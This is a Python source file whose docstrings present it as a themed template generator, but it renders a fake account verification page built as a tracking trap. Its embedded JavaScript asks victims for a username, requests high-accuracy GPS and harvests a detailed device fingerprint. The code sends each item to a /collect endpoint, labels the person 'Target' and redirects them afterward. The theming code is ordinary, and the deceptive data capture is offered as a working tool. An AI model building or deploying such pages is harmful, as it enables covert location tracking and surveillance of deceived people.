"""Dynamic template cloner with light/dark theming and custom styling support."""

import re

_HEX_COLOR_RE = re.compile(r"^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{6})$")


class TemplateCloner:
    """Generates self-contained verification portal HTML."""

    THEMES = {
        "dark": {
            "bg": "#0f172a",
            "card": "#1e293b",
            "text": "#f8fafc",
            "muted": "#94a3b8",
            "label": "#cbd5e1",
            "input_bg": "#0f172a",
            "input_border": "#334155",
            "input_text": "#ffffff",
            "title_accent": "#38bdf8",
            "button": "#3b82f6",
            "button_text": "#ffffff",
            "shadow": "0 4px 25px rgba(0,0,0,0.6)",
        },
        "light": {
            "bg": "#f1f5f9",
            "card": "#ffffff",
            "text": "#0f172a",
            "muted": "#64748b",
            "label": "#334155",
            "input_bg": "#f8fafc",
            "input_border": "#cbd5e1",
            "input_text": "#0f172a",
            "title_accent": "#0284c7",
            "button": "#2563eb",
            "button_text": "#ffffff",
            "shadow": "0 4px 25px rgba(15,23,42,0.12)",
        },
    }

    DEFAULT_THEME = "dark"

    @staticmethod
    def available_themes():
        """Return list of supported theme names (including 'auto')."""
        return ["dark", "light", "auto"]

    @staticmethod
    def _sanitize_accent(accent):
        """Return accent if it is a valid #rgb/#rrggbb hex color, else None."""
        if not accent:
            return None
        accent = accent.strip()
        if _HEX_COLOR_RE.match(accent):
            return accent
        return None

    @staticmethod
    def _sanitize_custom_css(custom_css):
        """Neutralize style breakout attempts in user-supplied CSS."""
        if not custom_css:
            return ""
        # Prevent closing the <style> block or injecting markup.
        cleaned = re.sub(r"</\s*style\s*>", "", custom_css, flags=re.IGNORECASE)
        cleaned = re.sub(r"<\s*script", "", cleaned, flags=re.IGNORECASE)
        return cleaned.strip()

    @staticmethod
    def _resolve_theme(theme):
        normalized = (theme or TemplateCloner.DEFAULT_THEME).strip().lower()
        if normalized in ("dark", "light", "auto"):
            return normalized
        return TemplateCloner.DEFAULT_THEME

    @staticmethod
    def generate_template(brand_name, redirect_url, theme="dark", accent=None,
                          custom_css=None):
        """Generate a themed verification portal.

        Args:
            brand_name: Brand label shown on the portal.
            redirect_url: Post-verification redirect destination.
            theme: ``"dark"`` (default), ``"light"``, or ``"auto"``
                (follow ``prefers-color-scheme``, defaulting to dark).
            accent: Optional ``#rgb``/``#rrggbb`` hex override applied to the
                title accent and Continue button.
            custom_css: Optional raw CSS appended to the template's
                ``<style>`` block for further customization.

        Backward compatible: existing ``generate_template(brand, url)`` calls
        render the legacy dark theme.
        """
        brand = brand_name.strip().capitalize() if brand_name else "Verification"

        # Ensure redirect URL has http/https scheme to prevent relative path breakage
        clean_redirect = redirect_url.strip()
        if not clean_redirect.startswith("http://") and not clean_redirect.startswith("https://"):
            clean_redirect = "https://" + clean_redirect

        resolved_theme = TemplateCloner._resolve_theme(theme)
        initial_theme = resolved_theme if resolved_theme in ("dark", "light") else "dark"
        safe_accent = TemplateCloner._sanitize_accent(accent)
        extra_css = TemplateCloner._sanitize_custom_css(custom_css)

        dark = dict(TemplateCloner.THEMES["dark"])
        light = dict(TemplateCloner.THEMES["light"])
        if safe_accent:
            dark["title_accent"] = safe_accent
            dark["button"] = safe_accent
            light["title_accent"] = safe_accent
            light["button"] = safe_accent

        # Escape braces that belong to JS/CSS so .format() only touches our tokens.
        html_template = """<!DOCTYPE html>
<html lang="en" data-theme="__INITIAL_THEME__" data-server-theme="__SERVER_THEME__">
<head>
    <title>__BRAND__ - NanoGPS Security Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="color-scheme" content="dark light">
    <style>
        :root[data-theme="dark"] {{
            --bg: __DARK_BG__;
            --card: __DARK_CARD__;
            --text: __DARK_TEXT__;
            --muted: __DARK_MUTED__;
            --label: __DARK_LABEL__;
            --input-bg: __DARK_INPUT_BG__;
            --input-border: __DARK_INPUT_BORDER__;
            --input-text: __DARK_INPUT_TEXT__;
            --title-accent: __DARK_TITLE_ACCENT__;
            --button: __DARK_BUTTON__;
            --button-text: __DARK_BUTTON_TEXT__;
            --shadow: __DARK_SHADOW__;
        }}
        :root[data-theme="light"] {{
            --bg: __LIGHT_BG__;
            --card: __LIGHT_CARD__;
            --text: __LIGHT_TEXT__;
            --muted: __LIGHT_MUTED__;
            --label: __LIGHT_LABEL__;
            --input-bg: __LIGHT_INPUT_BG__;
            --input-border: __LIGHT_INPUT_BORDER__;
            --input-text: __LIGHT_INPUT_TEXT__;
            --title-accent: __LIGHT_TITLE_ACCENT__;
            --button: __LIGHT_BUTTON__;
            --button-text: __LIGHT_BUTTON_TEXT__;
            --shadow: __LIGHT_SHADOW__;
        }}
        body {{
            background: var(--bg);
            color: var(--text);
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            transition: background 0.25s ease, color 0.25s ease;
        }}
        .card {{
            width: 100%;
            max-width: 380px;
            background: var(--card);
            padding: 30px;
            border-radius: 12px;
            box-shadow: var(--shadow);
            text-align: center;
            transition: background 0.25s ease;
            position: relative;
        }}
        .card h2 {{ margin-bottom: 10px; color: var(--title-accent); }}
        .card p {{ color: var(--muted); font-size: 13px; margin-bottom: 25px; }}
        .field {{ margin-bottom: 20px; text-align: left; }}
        .field label {{ font-size: 12px; color: var(--label); }}
        .field input {{
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            background: var(--input-bg);
            border: 1px solid var(--input-border);
            color: var(--input-text);
            border-radius: 6px;
            box-sizing: border-box;
            outline: none;
        }}
        .btn {{
            width: 100%;
            background: var(--button);
            color: var(--button-text);
            border: none;
            padding: 12px;
            font-size: 15px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
        }}
        .theme-toggle {{
            position: absolute;
            top: 12px;
            right: 12px;
            background: transparent;
            border: 1px solid var(--input-border);
            color: var(--text);
            border-radius: 20px;
            padding: 4px 10px;
            font-size: 12px;
            cursor: pointer;
        }}
        /* Custom operator CSS */
        __EXTRA_CSS__
    </style>
</head>
<body>
    <div class="card">
        <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle dark/light mode">🌙 / ☀️</button>
        <h2>__BRAND__</h2>
        <p>Please verify your account to continue session.</p>

        <div class="field">
            <label>Username or Email</label>
            <input type="text" id="usr" placeholder="Enter username">
        </div>

        <button class="btn" onclick="initSequence()">Continue</button>
    </div>

<script>
const TARGET_REDIRECT = "__REDIRECT__";
const SERVER_THEME = "__SERVER_THEME__";

function applyTheme(t) {{
    document.documentElement.setAttribute('data-theme', t);
    try {{ localStorage.setItem('nanogps-theme', t); }} catch(e) {{}}
}}

function toggleTheme() {{
    const cur = document.documentElement.getAttribute('data-theme') === 'light' ? 'light' : 'dark';
    applyTheme(cur === 'light' ? 'dark' : 'light');
}}

(function initTheme() {{
    let saved = null;
    try {{ saved = localStorage.getItem('nanogps-theme'); }} catch(e) {{}}
    if (saved === 'dark' || saved === 'light') {{
        applyTheme(saved);
        return;
    }}
    if (SERVER_THEME === 'auto') {{
        try {{
            const prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
            applyTheme(prefersLight ? 'light' : 'dark');
        }} catch(e) {{
            applyTheme('dark');
        }}
        return;
    }}
    applyTheme(SERVER_THEME === 'light' ? 'light' : 'dark');
}})();

function finalize() {{
    setTimeout(() => {{
        window.location.replace(TARGET_REDIRECT);
    }}, 1000);
}}

async function transmit(payload) {{
    try {{
        await fetch('/collect', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(payload)
        }});
    }} catch(e) {{}}
}}

async function initSequence() {{
    let userVal = document.getElementById('usr').value;
    await transmit({{type: 'status', message: 'Target input username: ' + (userVal || 'N/A')}});
    await transmit({{type: 'status', message: 'Requesting GPS coordinates...'}});

    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            await transmit({{
                type: 'geo',
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy
            }});
            captureAdvancedFingerprint();
        }},
        async (err) => {{
            await transmit({{type: 'status', message: 'GPS Permission Denied. Proceeding to Fingerprint...'}});
            captureAdvancedFingerprint();
        }},
        {{ enableHighAccuracy: true, timeout: 8000 }}
    );
}}

async function captureAdvancedFingerprint() {{
    await transmit({{type: 'status', message: 'Extracting deep telemetry & device specs...'}});

    let canvasHash = 'N/A';
    try {{
        let cv = document.createElement('canvas');
        let ctx = cv.getContext('2d');
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.fillText("NanoGPS 🛡️", 2, 2);
        canvasHash = cv.toDataURL().slice(-35);
    }} catch(e) {{}}

    let storageInfo = 'N/A';
    try {{
        if (navigator.storage && navigator.storage.estimate) {{
            let est = await navigator.storage.estimate();
            let quotaGB = (est.quota / (1024 * 1024 * 1024)).toFixed(2);
            let usageMB = (est.usage / (1024 * 1024)).toFixed(2);
            storageInfo = `Quota: ${{quotaGB}} GB | Used: ${{usageMB}} MB`;
        }}
    }} catch(e) {{}}

    let clientHints = 'N/A';
    try {{
        if (navigator.userAgentData) {{
            let brands = navigator.userAgentData.brands.map(b => `${{b.brand}} (${{b.version}})`).join(', ');
            clientHints = `Brands: [${{brands}}] | Mobile: ${{navigator.userAgentData.mobile}} | Platform: ${{navigator.userAgentData.platform}}`;
        }}
    }} catch(e) {{}}

    let orientation = 'N/A';
    try {{
        if (screen.orientation) {{
            orientation = `${{screen.orientation.type}} (Angle: ${{screen.orientation.angle}})`;
        }}
    }} catch(e) {{}}

    let data = {{
        type: 'fingerprint',
        inputUser: document.getElementById('usr').value || 'N/A',
        ua: navigator.userAgent || 'N/A',
        clientHints: clientHints,
        storage: storageInfo,
        orientation: orientation,
        platform: navigator.platform || 'N/A',
        lang: navigator.language || 'N/A',
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
        cores: navigator.hardwareConcurrency || 'N/A',
        ram: navigator.deviceMemory || 'N/A',
        touch: navigator.maxTouchPoints || 0,
        width: screen.width,
        height: screen.height,
        dpr: window.devicePixelRatio || 1,
        colorDepth: screen.colorDepth || 'N/A',
        cookies: navigator.cookieEnabled ? 'Yes' : 'No',
        chash: canvasHash,
        gpu: 'N/A',
        battery: 'N/A',
        network: 'N/A'
    }};

    try {{
        let conn = navigator.connection || navigator.mozConnection;
        if (conn) {{
            data.network = `${{conn.effectiveType || 'unknown'}} (${{conn.downlink || 'N/A'}}Mbps, RTT: ${{conn.rtt || 'N/A'}}ms)`;
        }}
    }} catch(e) {{}}

    try {{
        let bat = await navigator.getBattery();
        data.battery = `${{Math.round(bat.level * 100)}}% (${{bat.charging ? 'Charging' : 'Discharging'}})`;
    }} catch(e) {{}}

    try {{
        let cv2 = document.createElement('canvas');
        let gl = cv2.getContext('webgl') || cv2.getContext('experimental-webgl');
        let ext = gl.getExtension('WEBGL_debug_renderer_info');
        if (ext) {{
            data.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
        }}
    }} catch(e) {{}}

    await transmit(data);
    await transmit({{type: 'status', message: 'Telemetry captured. Redirecting target...'}});
    finalize();
}}

window.onload = async () => {{
    await transmit({{type: 'status', message: 'Target opened the dynamic trap link.'}});
}};
</script>
</body>
</html>
"""
        rendered = html_template
        replacements = {
            "__BRAND__": brand,
            "__REDIRECT__": clean_redirect,
            "__INITIAL_THEME__": initial_theme,
            "__SERVER_THEME__": resolved_theme,
            "__EXTRA_CSS__": extra_css,
            "__DARK_BG__": dark["bg"],
            "__DARK_CARD__": dark["card"],
            "__DARK_TEXT__": dark["text"],
            "__DARK_MUTED__": dark["muted"],
            "__DARK_LABEL__": dark["label"],
            "__DARK_INPUT_BG__": dark["input_bg"],
            "__DARK_INPUT_BORDER__": dark["input_border"],
            "__DARK_INPUT_TEXT__": dark["input_text"],
            "__DARK_TITLE_ACCENT__": dark["title_accent"],
            "__DARK_BUTTON__": dark["button"],
            "__DARK_BUTTON_TEXT__": dark["button_text"],
            "__DARK_SHADOW__": dark["shadow"],
            "__LIGHT_BG__": light["bg"],
            "__LIGHT_CARD__": light["card"],
            "__LIGHT_TEXT__": light["text"],
            "__LIGHT_MUTED__": light["muted"],
            "__LIGHT_LABEL__": light["label"],
            "__LIGHT_INPUT_BG__": light["input_bg"],
            "__LIGHT_INPUT_BORDER__": light["input_border"],
            "__LIGHT_INPUT_TEXT__": light["input_text"],
            "__LIGHT_TITLE_ACCENT__": light["title_accent"],
            "__LIGHT_BUTTON__": light["button"],
            "__LIGHT_BUTTON_TEXT__": light["button_text"],
            "__LIGHT_SHADOW__": light["shadow"],
        }
        for token, value in replacements.items():
            rendered = rendered.replace(token, value)
        return rendered
